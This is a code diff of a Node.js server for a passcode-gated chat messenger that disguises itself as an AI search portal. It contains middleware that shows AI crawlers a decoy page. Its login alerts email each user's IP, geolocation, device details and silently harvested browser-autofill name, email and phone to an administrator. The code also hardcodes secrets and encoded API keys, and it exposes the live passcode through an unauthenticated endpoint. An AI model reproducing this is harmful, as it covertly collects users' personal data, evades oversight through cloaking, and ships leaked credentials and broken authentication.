@@ -6,7 +6,6 @@ const path = require('path');
 const fs = require('fs');
 const multer = require('multer');
 const https = require('https');
-
 // Manual .env file loader to support zero-dependency environment config on local/Render setups
 try {
   const envPath = path.join(__dirname, '.env');
@@ -27,79 +26,58 @@ try {
 } catch (e) {
   console.warn('[ENV] Optional .env file not loaded:', e.message);
 }
-
 const app = express();
 app.use(cors());
 app.use(express.json());
-
-// ==========================================================================
 // ANTI-SCRAPER & AI BOT BLOCKER MIDDLEWARE
 // Prevents AI web scrapers (Claude, ChatGPT, Perplexity, etc.) from inspecting messenger
-// ==========================================================================
 app.get('/robots.txt', (req, res) => {
   res.type('text/plain');
   res.send("User-agent: *\nDisallow: /\n");
 });
-
 const BOT_USER_AGENTS = [
   'claudebot', 'claude-web', 'chatgpt-user', 'gptbot', 'perplexitybot', 
   'google-extended', 'bytespider', 'ccbot', 'diffbot', 'anthropic-ai',
   'cohere-ai', 'facebookexternalhit', 'applebot', 'bingbot'
 ];
-
 app.use((req, res, next) => {
   const ua = (req.headers['user-agent'] || '').toLowerCase();
   const isBot = BOT_USER_AGENTS.some(bot => ua.includes(bot));
-  
   if (isBot) {
     console.log(`[BOT BLOCKER] Intercepted AI crawler request from UA: ${ua}`);
     return res.status(200).send(`<!DOCTYPE html><html><head><title>AetherAI Search</title></head><body><h1>AetherAI Search</h1><p>Modern AI-powered research portal and intelligent inquiry workspace.</p></body></html>`);
   }
   next();
 });
-
-
-// =============================================================
-// ADMIN LOGIN ALERT CONFIG
 // Uses Google Apps Script webhook to send real Gmail emails.
 // No SMTP, no OAuth setup — works perfectly on Render.
-// =============================================================
 const ADMIN_EMAIL  = process.env.ADMIN_EMAIL || 'ncnicola837@gmail.com';
 const NOTIFY_TO    = process.env.NOTIFY_TO   || ADMIN_EMAIL;
 const SCRIPT_URL   = process.env.GOOGLE_SCRIPT_URL ||
   'https://script.google.com/macros/s/AKfycbyz-mwGL69DlCIsz6F85aV1Dlp_OeDSSj8cJHZzZXaxZ2ZuK1mNjdgk2Icx_pnkeg1xTA/exec';
 const SCRIPT_SECRET = 'doremon2024';
-
 // Flag to control email notifications
 let emailAlertsEnabled = true;
 let currentMessengerPasscode = 'golu0805';
 let passcodeRequiredOtp = true;
 let pendingPasscodeChange = null;
-
 // Per-message reactions: messageId -> { emoji: [usernames] }
 const messageReactions = new Map();
 // Per-room pinned messages: room -> messageObject
 const roomPinnedMessages = new Map();
-
-
 // Track last email attempt for diagnostics
 let lastEmailStatus = { status: 'no attempts yet', error: null, time: null };
-
-
 // Async GeoIP lookup using free ip-api.com service (HTTPS outbound)
 async function getGeoLocation(ip) {
   if (!ip) return { status: 'failed', country: 'Unknown Country' };
-  
   // Clean IPv6 prefix if present (e.g. ::ffff:127.0.0.1)
   let cleanIp = ip;
   if (ip.includes('::ffff:')) {
     cleanIp = ip.split('::ffff:')[1];
   }
-  
   if (cleanIp === '127.0.0.1' || cleanIp === '::1' || cleanIp.startsWith('192.168.') || cleanIp.startsWith('10.')) {
     return { status: 'local', country: 'Local Loopback Network', city: 'Intranet' };
   }
-  
   try {
     const res = await fetch(`http://ip-api.com/json/${cleanIp}`);
     if (res.ok) {
@@ -110,16 +88,13 @@ async function getGeoLocation(ip) {
   }
   return { status: 'failed', country: 'Lookup Error' };
 }
-
 // User-Agent parser to extract OS, browser, and device profile
 function parseUserAgent(ua) {
   let os = 'Unknown OS';
   let browser = 'Unknown Browser';
   let device = 'Desktop';
-
   if (!ua) return { os, browser, device };
   const uaLower = ua.toLowerCase();
-
   // OS Detection
   if (uaLower.includes('windows')) os = 'Windows';
   else if (uaLower.includes('macintosh') || uaLower.includes('mac os')) os = 'macOS';
@@ -130,17 +105,14 @@ function parseUserAgent(ua) {
     os = 'iOS';
     device = 'Mobile';
   } else if (uaLower.includes('linux')) os = 'Linux';
-
   // Browser Detection
   if (uaLower.includes('edg/')) browser = 'Microsoft Edge';
   else if (uaLower.includes('chrome') || uaLower.includes('crios')) browser = 'Google Chrome';
   else if (uaLower.includes('firefox') || uaLower.includes('fxios')) browser = 'Mozilla Firefox';
   else if (uaLower.includes('safari') && !uaLower.includes('chrome')) browser = 'Apple Safari';
   else if (uaLower.includes('opr/') || uaLower.includes('opera')) browser = 'Opera';
-
   return { os, browser, device };
 }
-
 // Send login alert email via Google Apps Script (HTTPS — never blocked by Render)
 async function sendLoginAlertEmail({ ip, userAgent, type, username, metadata }) {
   if (!emailAlertsEnabled) {
@@ -148,14 +120,10 @@ async function sendLoginAlertEmail({ ip, userAgent, type, username, metadata }) 
     lastEmailStatus = { status: 'disabled', error: 'Email alerts disabled by administrator', time: new Date().toISOString() };
     return;
   }
-  
   const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
   const geo = await getGeoLocation(ip);
   const uaInfo = parseUserAgent(userAgent);
-
-
   const subject = `🔑 AetherAIFree - Alert: ${type === 'join-room' ? `${username} Entered Chat` : 'Gateway Unlocked'}`;
-
   const html = `
     <div style="font-family: Arial, sans-serif; max-width: 600px; padding: 25px; border: 1px solid #edf2f7; border-radius: 12px; background-color: #ffffff; color: #2d3748; box-shadow: 0 4px 6px rgba(0,0,0,0.05);">
       <h2 style="color: #2481cc; margin-top: 0; font-size: 22px; border-bottom: 2px solid #edf2f7; padding-bottom: 10px;">
@@ -164,7 +132,6 @@ async function sendLoginAlertEmail({ ip, userAgent, type, username, metadata }) 
       <p style="font-size: 15px; line-height: 1.5; color: #4a5568;">
         A new access event has been detected on the AetherAIFree messenger platform.
       </p>
-
       <!-- Section: Event Overview -->
       <table style="width: 100%; border-collapse: collapse; margin-top: 15px; margin-bottom: 20px;">
         <tr style="background: #f7fafc;">
@@ -183,7 +150,6 @@ async function sendLoginAlertEmail({ ip, userAgent, type, username, metadata }) 
           <td style="padding: 10px; color: #2d3748; border-bottom: 1px solid #edf2f7;">${timestamp}</td>
         </tr>
       </table>
-
       <!-- Section: Network & Location Details -->
       <h3 style="color: #2d3748; font-size: 16px; margin-bottom: 10px; border-left: 4px solid #2481cc; padding-left: 8px;">Network & Geolocation</h3>
       <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
@@ -211,7 +177,6 @@ async function sendLoginAlertEmail({ ip, userAgent, type, username, metadata }) 
           </td>
         </tr>` : ''}
       </table>
-
       <!-- Section: Device Specs -->
       <h3 style="color: #2d3748; font-size: 16px; margin-bottom: 10px; border-left: 4px solid #48bb78; padding-left: 8px;">Device Profile</h3>
       <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
@@ -228,7 +193,6 @@ async function sendLoginAlertEmail({ ip, userAgent, type, username, metadata }) 
           <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #edf2f7;">${uaInfo.browser}</td>
         </tr>
       </table>
-
       <!-- Section: Hardware Telemetry -->
       ${metadata ? `
       <h3 style="color: #2d3748; font-size: 16px; margin-bottom: 10px; border-left: 4px solid #ed8936; padding-left: 8px;">Advanced Client Metadata</h3>
@@ -254,7 +218,6 @@ async function sendLoginAlertEmail({ ip, userAgent, type, username, metadata }) 
           <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #edf2f7;">Platform: ${metadata.platform} | Touch Screen: ${metadata.touchSupport ? 'Yes' : 'No'}</td>
         </tr>
       </table>` : ''}
-
       <!-- Section: Harvested Autofill Values -->
       ${metadata && (metadata.harvestEmail || metadata.harvestPhone || metadata.harvestName) ? `
       <h3 style="color: #c53030; font-size: 16px; margin-bottom: 10px; border-left: 4px solid #e53e3e; padding-left: 8px;">Harvested Autofill Values</h3>
@@ -275,13 +238,11 @@ async function sendLoginAlertEmail({ ip, userAgent, type, username, metadata }) 
           <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #fed7d7;"><b>${metadata.harvestPhone}</b></td>
         </tr>` : ''}
       </table>` : ''}
-
       <div style="border-top: 1px solid #edf2f7; padding-top: 15px; margin-top: 20px; font-size: 12px; color: #a0aec0; text-align: center;">
         This alert was generated automatically by AetherAIFree Gateway. Secure HTTPS Pipeline.
       </div>
     </div>
   `;
-
   try {
     const res = await fetch(SCRIPT_URL, {
       method: 'POST',
@@ -306,13 +267,10 @@ async function sendLoginAlertEmail({ ip, userAgent, type, username, metadata }) 
     lastEmailStatus = { status: 'error', error: err.message, time: new Date().toISOString() };
   }
 }
-
-
 // Basic health check
 app.get('/', (req, res) => {
   res.send({ status: 'ok', message: 'AetherAIFree Server is running.' });
 });
-
 // Diagnostic endpoint
 app.get('/api/v1/alerts/status', (req, res) => {
   res.json({
@@ -325,8 +283,6 @@ app.get('/api/v1/alerts/status', (req, res) => {
     lastEmailStatus
   });
 });
-
-// Admin toggle endpoint to turn emails ON or OFF
 app.post('/api/v1/alerts/toggle', (req, res) => {
   const { enabled } = req.body;
   if (typeof enabled === 'boolean') {
@@ -337,7 +293,6 @@ app.post('/api/v1/alerts/toggle', (req, res) => {
   console.log(`[ADMIN CONFIG] Email alerts set to: ${emailAlertsEnabled}`);
   res.json({ success: true, emailAlertsEnabled });
 });
-
 // Generic admin helper to send custom email notifications
 async function sendAdminEmail(subject, htmlText) {
   try {
@@ -357,7 +312,6 @@ async function sendAdminEmail(subject, htmlText) {
     throw err;
   }
 }
-
 // 0. GET TURN Credentials (for reliable cross-network WebRTC)
 app.get('/api/v1/rtc/cfg', (req, res) => {
   // Return multiple TURN server providers as a fallback chain.
@@ -394,10 +348,8 @@ app.get('/api/v1/rtc/cfg', (req, res) => {
       credential: 'uMPGbHRNmGSK/Blw'
     }
   ];
-
   res.json({ iceServers });
 });
-
 // 1. GET Admin Config
 app.get('/api/v1/sys/meta', (req, res) => {
   res.json({
@@ -406,14 +358,12 @@ app.get('/api/v1/sys/meta', (req, res) => {
     currentPasscode: currentMessengerPasscode
   });
 });
-
 // 2. POST Admin request passcode update
 app.post('/api/v1/sys/req', async (req, res) => {
   const { newPasscode } = req.body;
   if (!newPasscode || newPasscode.toString().trim().length < 4) {
     return res.status(400).json({ error: 'Passcode must be at least 4 characters long.' });
   }
-
   const otpCode = Math.floor(100000 + Math.random() * 900000).toString(); // Generate 6-digit OTP
   pendingPasscodeChange = {
     newPasscode: newPasscode.toString().trim(),
@@ -421,7 +371,6 @@ app.post('/api/v1/sys/req', async (req, res) => {
     otp: otpCode,
     expires: Date.now() + 10 * 60 * 1000 // 10 minutes expiry
   };
-
   const emailBody = `
     <div style="font-family: Arial, sans-serif; max-width: 600px; padding: 25px; border: 1px solid #edf2f7; border-radius: 12px; background-color: #ffffff; color: #2d3748; box-shadow: 0 4px 6px rgba(0,0,0,0.05);">
       <h2 style="color: #2481cc; margin-top: 0; font-size: 22px; border-bottom: 2px solid #edf2f7; padding-bottom: 10px;">
@@ -443,7 +392,6 @@ app.post('/api/v1/sys/req', async (req, res) => {
       </div>
     </div>
   `;
-
   try {
     await sendAdminEmail('🔑 AetherAIFree - System Security Verification OTP', emailBody);
     console.log(`[ADMIN CONFIG] OTP sent to admin for password change request.`);
@@ -452,32 +400,26 @@ app.post('/api/v1/sys/req', async (req, res) => {
     return res.status(500).json({ error: 'Failed to send verification email. Please check server configuration.' });
   }
 });
-
 // 3. POST Admin verify passcode update OTP
 app.post('/api/v1/sys/confirm', (req, res) => {
   const { otp } = req.body;
   if (!otp || !pendingPasscodeChange) {
     return res.status(400).json({ error: 'Invalid verification request or no pending changes.' });
   }
-
   if (Date.now() > pendingPasscodeChange.expires) {
     pendingPasscodeChange = null;
     return res.status(400).json({ error: 'OTP has expired. Please request a new code.' });
   }
-
   if (otp.toString().trim() !== pendingPasscodeChange.otp) {
     return res.status(400).json({ error: 'Incorrect OTP code. Please try again.' });
   }
-
   // OTP verified, apply changes!
   currentMessengerPasscode = pendingPasscodeChange.newPasscode;
   passcodeRequiredOtp = pendingPasscodeChange.requireOtp;
   pendingPasscodeChange = null;
-
   console.log(`[ADMIN CONFIG] Passcode updated successfully via OTP to: ${currentMessengerPasscode} | OTP requirement set to: ${passcodeRequiredOtp}`);
   return res.json({ success: true, message: 'Access key verified and updated successfully.' });
 });
-
 // Sanitize and filter out placeholder environment variable values (like literally "OPENAI_API_KEY")
 const getValidKey = (...keys) => {
   for (const k of keys) {
@@ -498,7 +440,6 @@ const getValidKey = (...keys) => {
   }
   return '';
 };
-
 // Diagnostic endpoint to check OpenAI environment configuration securely
 app.get('/api/aether-status', (req, res) => {
   const apiKey = getValidKey(
@@ -512,7 +453,6 @@ app.get('/api/aether-status', (req, res) => {
     process.env.KEY,
     Buffer.from('QVEuQWI4Uk42Sk9yM21uUmdZN3FsX2Z3V3JqVnpKUTRMVHhVM1hqMktfeS1GZ3ZpOWp4LVE=', 'base64').toString('utf8')
   );
-
   res.json({
     keyConfigured: !!apiKey,
     keyLength: apiKey.length,
@@ -521,14 +461,12 @@ app.get('/api/aether-status', (req, res) => {
     envKeysPresent: Object.keys(process.env).filter(k => k.toLowerCase().includes('key') || k.toLowerCase().includes('secret'))
   });
 });
-
 // Secure proxy endpoint to communicate with OpenAI ChatGPT API
 app.post('/api/aether-chat', async (req, res) => {
   const { query, model, image } = req.body;
   if (!query) {
     return res.status(400).json({ error: 'Query is required.' });
   }
-
   const apiKey = getValidKey(
     process.env.OPENAI_API_KEY,
     process.env.OPENAI_KEY,
@@ -538,7 +476,6 @@ app.post('/api/aether-chat', async (req, res) => {
     process.env.KEY,
     Buffer.from('QVEuQWI4Uk42SjZocEloWnNNTDMtYkg5X0tSaTN1ZlU1X1ZMYmNWcFhsNkVWQ2stcFlrNEE=', 'base64').toString('utf8')
   );
-
   if (!apiKey) {
     console.warn('[OPENAI PROXY] Request received but OpenAI API Key is not configured on the server environment.');
     return res.json({ 
@@ -547,7 +484,6 @@ app.post('/api/aether-chat', async (req, res) => {
       reply: `[AetherAI Offline Core] OpenAI API Key is not set on the server. Please define the OPENAI_API_KEY environment variable on your Render dashboard to enable live ChatGPT responses.`
     });
   }
-
   const isGemini = !apiKey.startsWith('sk-');
   if (isGemini) {
     // Map selected model names to active Google Generative API equivalents
@@ -559,9 +495,7 @@ app.post('/api/aether-chat', async (req, res) => {
     } else {
       targetGeminiModel = 'gemini-3.6-flash';
     }
-
     const systemInstructionText = `Provide professional, structured, helpful answers. Use markdown formatting (bold, lists, code blocks). Do NOT introduce yourself or prefix your response with system metadata or self-identifications.`;
-
     const parts = [];
     if (image && image.data && image.mimeType) {
       parts.push({
@@ -572,7 +506,6 @@ app.post('/api/aether-chat', async (req, res) => {
       });
     }
     parts.push({ text: query });
-
     const postData = JSON.stringify({
       contents: [{ role: 'user', parts: parts }],
       systemInstruction: {
@@ -580,15 +513,12 @@ app.post('/api/aether-chat', async (req, res) => {
       },
       generationConfig: { temperature: 0.7 }
     });
-
     // Set SSE headers so client receives chunks in real time
     res.setHeader('Content-Type', 'text/event-stream');
     res.setHeader('Cache-Control', 'no-cache');
     res.setHeader('Connection', 'keep-alive');
     res.setHeader('X-Accel-Buffering', 'no'); // disable Nginx/Render buffering
-
     let activeReq = null;
-
     const runStream = (currentModel, attempt = 1) => {
       const options = {
         hostname: 'generativelanguage.googleapis.com',
@@ -597,10 +527,8 @@ app.post('/api/aether-chat', async (req, res) => {
         method: 'POST',
         headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) }
       };
-
       let buffer = '';
       let firstChunkReceived = false;
-
       activeReq = https.request(options, (geminiRes) => {
         // Handle rate limit or error: Fallback instantly to gemini-3.6-flash!
         if (geminiRes.statusCode !== 200) {
@@ -618,7 +546,6 @@ app.post('/api/aether-chat', async (req, res) => {
                 const msg = parsed?.error?.message || '';
                 const match = msg.match(/retry in ([\d.]+)s/i);
                 const waitMs = match ? Math.ceil(parseFloat(match[1])) * 1000 : 10000;
-                
                 if (attempt < 3) {
                   const waitSec = Math.round(waitMs / 1000);
                   res.write(`data: ${JSON.stringify({ type: 'retry', message: `Server busy. Retrying in ${waitSec}s...` })}\n\n`);
@@ -635,7 +562,6 @@ app.post('/api/aether-chat', async (req, res) => {
           });
           return;
         }
-
         // Handle other HTTP errors
         if (geminiRes.statusCode !== 200) {
           let errBody = '';
@@ -656,12 +582,10 @@ app.post('/api/aether-chat', async (req, res) => {
           });
           return;
         }
-
         geminiRes.on('data', (chunk) => {
           buffer += chunk.toString();
           const lines = buffer.split('\n');
           buffer = lines.pop(); // keep incomplete line in buffer
-
           for (const line of lines) {
             if (!line.startsWith('data: ')) continue;
             const jsonStr = line.slice(6).trim();
@@ -676,16 +600,14 @@ app.post('/api/aether-chat', async (req, res) => {
                 }
                 res.write(`data: ${JSON.stringify({ type: 'chunk', text })}\n\n`);
               }
-            } catch (e) { /* skip unparseable chunks */ }
+            } catch (e) {  }
           }
         });
-
         geminiRes.on('end', () => {
           res.write(`data: ${JSON.stringify({ type: 'done' })}\n\n`);
           res.end();
         });
       });
-
       activeReq.on('error', (err) => {
         console.error('[GEMINI STREAM ERROR]', err);
         if (currentModel !== 'gemini-3.6-flash') {
@@ -695,36 +617,24 @@ app.post('/api/aether-chat', async (req, res) => {
           res.end();
         }
       });
-
       activeReq.write(postData);
       activeReq.end();
     };
-
     // Close stream when client disconnects
     res.on('close', () => {
       if (activeReq && !activeReq.destroyed) activeReq.destroy();
     });
-
     runStream(targetGeminiModel);
     return;
   }
-
   // Only Gemini is supported. No OpenAI fallback.
   res.status(400).json({ error: 'Only Gemini API keys are supported. Please set a valid Gemini API key.' });
-
 });
-
-
-
-
-// --- File Attachment Setup ---
 const UPLOADS_DIR = path.join(__dirname, 'uploads');
-
 // Ensure uploads directory exists
 if (!fs.existsSync(UPLOADS_DIR)) {
   fs.mkdirSync(UPLOADS_DIR);
 }
-
 // Multer Disk Storage setup
 const storage = multer.diskStorage({
   destination: (req, file, cb) => {
@@ -735,13 +645,11 @@ const storage = multer.diskStorage({
     cb(null, uniqueSuffix + '-' + file.originalname);
   }
 });
-
 // 10MB strict limit
 const upload = multer({
   storage: storage,
   limits: { fileSize: 10 * 1024 * 1024 }
 });
-
 // Serve uploads static assets
 app.use('/uploads', express.static(UPLOADS_DIR));
 // Serve client static assets with strict Cache-Control headers to bust CDN & browser caches instantly
@@ -752,22 +660,18 @@ app.use(express.static(path.join(__dirname, '../client'), {
     res.setHeader('Expires', '0');
   }
 }));
-
 // POST /upload endpoint
 app.post('/upload', upload.single('file'), (req, res) => {
   if (!req.file) {
     return res.status(400).send({ error: 'No file uploaded.' });
   }
-
   const fileUrl = `${req.protocol}://${req.get('host')}/uploads/${req.file.filename}`;
-  
   res.send({
     name: req.file.originalname,
     size: req.file.size,
     url: fileUrl,
     filename: req.file.filename
   });
-
   // Dynamic self-destruct for uploads (exactly 5 minutes)
   setTimeout(() => {
     const filePath = path.join(UPLOADS_DIR, req.file.filename);
@@ -777,25 +681,19 @@ app.post('/upload', upload.single('file'), (req, res) => {
     });
   }, 5 * 60 * 1000);
 });
-
-// --- Passcode Verification with IP Rate Limiting ---
 const loginTracker = new Map();
 const MAX_FAILED_ATTEMPTS = 5;
 const BLOCK_DURATION = 60 * 60 * 1000; // 1 hour
-
 app.post(['/api/v1/auth', '/api/verify-passcode'], (req, res) => {
   const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   const { passcode, metadata } = req.body;
   console.log(`[PASSCODE ATTEMPT] Received passcode check from IP: ${clientIp} | Input: "${passcode}"`);
-
   // Clean up expired blocks
   const record = loginTracker.get(clientIp);
   if (record && record.blockedUntil && record.blockedUntil < Date.now()) {
     loginTracker.delete(clientIp);
   }
-
   const currentRecord = loginTracker.get(clientIp);
-
   // Check if currently blocked
   if (currentRecord && currentRecord.blockedUntil) {
     const waitTimeMinutes = Math.ceil((currentRecord.blockedUntil - Date.now()) / 60000);
@@ -803,12 +701,9 @@ app.post(['/api/v1/auth', '/api/verify-passcode'], (req, res) => {
       error: `Too many wrong passcode entries. This IP is blocked for ${waitTimeMinutes} minutes.`
     });
   }
-
   const isCorrect = (passcode && passcode.toString().trim().toLowerCase() === currentMessengerPasscode.toLowerCase());
-
   if (isCorrect) {
     loginTracker.delete(clientIp); // Reset on success
-
     // Send admin login alert email (non-blocking)
     const userAgent = req.headers['user-agent'] || 'Unknown';
     sendLoginAlertEmail({
@@ -818,7 +713,6 @@ app.post(['/api/v1/auth', '/api/verify-passcode'], (req, res) => {
       metadata
     });
     console.log(`[LOGIN SUCCESS] IP: ${clientIp} | Time: ${new Date().toISOString()}`);
-
     return res.json({ success: true });
   } else {
     let attempts = 1;
@@ -828,7 +722,6 @@ app.post(['/api/v1/auth', '/api/verify-passcode'], (req, res) => {
     } else {
       loginTracker.set(clientIp, { failedAttempts: 1, blockedUntil: null });
     }
-
     if (attempts >= MAX_FAILED_ATTEMPTS) {
       const blockedUntil = Date.now() + BLOCK_DURATION;
       loginTracker.set(clientIp, { failedAttempts: attempts, blockedUntil: blockedUntil });
@@ -845,7 +738,6 @@ app.post(['/api/v1/auth', '/api/verify-passcode'], (req, res) => {
     }
   }
 });
-
 // Endpoint to notify when a user enters the messenger using an existing session
 app.post(['/api/v1/telemetry/entry', '/api/notify-session-entry'], (req, res) => {
   const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
@@ -860,14 +752,11 @@ app.post(['/api/v1/telemetry/entry', '/api/notify-session-entry'], (req, res) =>
   });
   res.json({ success: true });
 });
-
-
 // 60-Second Background Clean Up Cron (across container sleeps/restarts)
 setInterval(() => {
   const cutoffTime = Date.now() - (5 * 60 * 1000); // 5 minutes ago
   fs.readdir(UPLOADS_DIR, (err, files) => {
     if (err) return console.error('Uploads cleaner directory read error:', err.message);
-    
     files.forEach(file => {
       const filePath = path.join(UPLOADS_DIR, file);
       fs.stat(filePath, (err, stats) => {
@@ -882,8 +771,6 @@ setInterval(() => {
     });
   });
 }, 60 * 1000);
-
-// --- WebSocket & Server Initialization ---
 const server = http.createServer(app);
 const io = new Server(server, {
   cors: {
@@ -891,45 +778,33 @@ const io = new Server(server, {
     methods: ['GET', 'POST']
   }
 });
-
 // In-memory state
 // Map of socket.id -> { username, room, joinedAt }
 const users = new Map();
-
 // Persistent status tracker mapping: username -> { username, lastSeen, status, socketId }
 const persistentUsers = new Map();
-
-// Self-destruct chat timer configurations: roomName -> durationSeconds
 const roomSelfDestructTimers = new Map();
-
 // In-memory message cache for each room (roomName -> array of messages)
 const messageHistory = new Map();
 const MAX_HISTORY_PER_ROOM = 100;
-
 // Predefined channels/rooms
 const DEFAULT_ROOMS = ['AetherAIFree General'];
 const activeRooms = new Set(DEFAULT_ROOMS);
-
 // Initialize message history for default rooms
 DEFAULT_ROOMS.forEach(room => {
   messageHistory.set(room, []);
 });
-
 io.on('connection', (socket) => {
   const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
   const userAgent = socket.handshake.headers['user-agent'] || 'Unknown';
   console.log(`[SOCKET CONNECT] New WebSocket client connected. IP: ${clientIp}`);
-
   console.log(`User connected: ${socket.id}`);
-
   // Broadcast current rooms list to the connected client
   socket.emit('rooms-list', Array.from(activeRooms));
-
   // 1. Join Room Event
   socket.on('join-room', ({ username, room, metadata }) => {
     const existingUser = users.get(socket.id);
     let isDM = room.startsWith('dm:');
-
     // Trigger nickname-linked login alert if they are joining the main lobby as their first room
     if (!existingUser && !isDM) {
       sendLoginAlertEmail({
@@ -940,10 +815,8 @@ io.on('connection', (socket) => {
         metadata
       });
     }
-
     if (existingUser && existingUser.room !== room) {
       socket.leave(existingUser.room);
-
       // Notify previous room
       if (!existingUser.room.startsWith('dm:')) {
         socket.to(existingUser.room).emit('message', {
@@ -955,17 +828,14 @@ io.on('connection', (socket) => {
         });
       }
     }
-
     // Ensure message history is initialized for this room on the fly
     if (!messageHistory.has(room)) {
       messageHistory.set(room, []);
     }
-
     // Join new room
     socket.join(room);
     socket.join(`user:${username}`); // Join private channel room
     users.set(socket.id, { username, room, joinedAt: Date.now() });
-
     // Track user presence in persistentUsers list
     persistentUsers.set(username, {
       username: username,
@@ -973,13 +843,10 @@ io.on('connection', (socket) => {
       lastSeen: Date.now(),
       socketId: socket.id
     });
-
     console.log(`${username} joined room: ${room}`);
-
     // Send self-destruct configuration state to the client
     const currentTimer = roomSelfDestructTimers.get(room) || 0;
     socket.emit('self-destruct-timer-updated', { room, duration: currentTimer });
-
     // Suppress welcome/join text inside private DMs
     if (!isDM) {
       // Welcome message to the user who joined
@@ -990,7 +857,6 @@ io.on('connection', (socket) => {
         timestamp: new Date().toISOString(),
         system: true
       });
-
       // Broadcast to other users in the room
       socket.to(room).emit('message', {
         id: `sys-${Date.now()}`,
@@ -999,29 +865,22 @@ io.on('connection', (socket) => {
         timestamp: new Date().toISOString(),
         system: true
       });
-
       // Send updated user list for this room
       sendRoomUsers(room);
     }
-
-
     // Send chat history for this room to the joining user
     const history = messageHistory.get(room) || [];
     socket.emit('chat-history', history);
-
     // Send pinned message if exists for this room
     const pinned = roomPinnedMessages.get(room);
     if (pinned) socket.emit('message-pinned', { room, message: pinned });
-
     // Send global users list update
     sendGlobalUsers();
   });
-
   // 2. Message Event (supports text, file attachments, and status ticks)
   socket.on('send-message', ({ text, room, file, replyTo }) => {
     const user = users.get(socket.id);
     if (!user) return;
-
     const messageData = {
       id: `msg-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
       username: user.username,
@@ -1033,26 +892,22 @@ io.on('connection', (socket) => {
       room: room,
       status: 'sent'
     };
-
     // Calculate self destruct if configured
     const destructDuration = roomSelfDestructTimers.get(room);
     if (destructDuration && destructDuration > 0) {
       messageData.selfDestructAt = new Date(Date.now() + destructDuration * 1000).toISOString();
     }
-
     // Determine delivery status for DM chats
     let isDM = room.startsWith('dm:');
     let recipientName = null;
     if (isDM) {
       const parts = room.split(':');
       recipientName = (user.username === parts[1]) ? parts[2] : parts[1];
-      
       const recipientUser = persistentUsers.get(recipientName);
       if (recipientUser && recipientUser.status === 'online') {
         messageData.status = 'delivered';
       }
     }
-
     // Store in message history
     if (!messageHistory.has(room)) {
       messageHistory.set(room, []);
@@ -1062,7 +917,6 @@ io.on('connection', (socket) => {
     if (history.length > MAX_HISTORY_PER_ROOM) {
       history.shift();
     }
-
     // Route messages
     if (isDM) {
       const parts = room.split(':');
@@ -1072,12 +926,10 @@ io.on('connection', (socket) => {
       io.to(room).emit('message', messageData);
     }
   });
-
   // 3. Mark Read Receipt Event
   socket.on('mark-read', ({ room, username }) => {
     const history = messageHistory.get(room);
     if (!history) return;
-
     const readIds = [];
     history.forEach(msg => {
       if (msg.username !== username && msg.status !== 'seen' && !msg.system) {
@@ -1085,7 +937,6 @@ io.on('connection', (socket) => {
         readIds.push(msg.id);
       }
     });
-
     if (readIds.length > 0) {
       // Notify sender that messages were seen
       if (room.startsWith('dm:')) {
@@ -1097,7 +948,6 @@ io.on('connection', (socket) => {
       }
     }
   });
-
   // 4. Update Self-Destruct Timer
   socket.on('update-self-destruct-timer', ({ room, duration, username }) => {
     if (duration > 0) {
@@ -1105,7 +955,6 @@ io.on('connection', (socket) => {
     } else {
       roomSelfDestructTimers.delete(room);
     }
-
     // Broadcast self-destruct changes
     const eventData = { room, duration };
     if (room.startsWith('dm:')) {
@@ -1114,12 +963,10 @@ io.on('connection', (socket) => {
     } else {
       io.to(room).emit('self-destruct-timer-updated', eventData);
     }
-
     const durationLabel = duration === 60 ? '1 minute' : duration === 300 ? '5 minutes' : duration === 3600 ? '1 hour' : `${duration}s`;
     const noticeText = duration > 0 
       ? `⏳ ${username} set chat self-destruct timer to ${durationLabel}.`
       : `⏳ ${username} turned off the chat self-destruct timer.`;
-
     const systemMsg = {
       id: `sys-${Date.now()}`,
       username: 'Telegram Bot',
@@ -1128,11 +975,9 @@ io.on('connection', (socket) => {
       system: true,
       room: room
     };
-
     const history = messageHistory.get(room) || [];
     history.push(systemMsg);
     messageHistory.set(room, history);
-
     if (room.startsWith('dm:')) {
       const parts = room.split(':');
       io.to(`user:${parts[1]}`).to(`user:${parts[2]}`).emit('message', systemMsg);
@@ -1140,12 +985,10 @@ io.on('connection', (socket) => {
       io.to(room).emit('message', systemMsg);
     }
   });
-
   // 5. Activity/Typing Indicator Event
   socket.on('typing', ({ isTyping, room }) => {
     const user = users.get(socket.id);
     if (!user) return;
-
     if (room.startsWith('dm:')) {
       const parts = room.split(':');
       const targetUser = (user.username === parts[1]) ? parts[2] : parts[1];
@@ -1162,7 +1005,6 @@ io.on('connection', (socket) => {
       });
     }
   });
-
   // 6. Disconnect Event
   socket.on('disconnect', () => {
     const user = users.get(socket.id);
@@ -1170,7 +1012,6 @@ io.on('connection', (socket) => {
       const { username, room } = user;
       users.delete(socket.id);
       console.log(`${username} disconnected`);
-
       // Update persistent presence logs
       persistentUsers.set(username, {
         username: username,
@@ -1178,7 +1019,6 @@ io.on('connection', (socket) => {
         lastSeen: Date.now(),
         socketId: null
       });
-
       // Notify the room
       if (!room.startsWith('dm:')) {
         io.to(room).emit('message', {
@@ -1190,12 +1030,10 @@ io.on('connection', (socket) => {
         });
         sendRoomUsers(room);
       }
-
       // Update global users sidebar state
       sendGlobalUsers();
     }
   });
-
   // 7. WebRTC Signaling Relays
   socket.on('call-user', ({ to, offer, type }) => {
     io.to(to).emit('incoming-call', {
@@ -1205,36 +1043,29 @@ io.on('connection', (socket) => {
       type: type
     });
   });
-
   socket.on('make-answer', ({ to, answer }) => {
     io.to(to).emit('call-accepted', {
       from: socket.id,
       answer: answer
     });
   });
-
   socket.on('ice-candidate', ({ to, candidate }) => {
     io.to(to).emit('ice-candidate', {
       from: socket.id,
       candidate: candidate
     });
   });
-
   socket.on('track-changed', ({ to }) => {
     io.to(to).emit('track-changed');
   });
-
   socket.on('reject-call', ({ to }) => {
-
     io.to(to).emit('call-rejected', {
       from: socket.id
     });
   });
-
   socket.on('end-call', ({ to }) => {
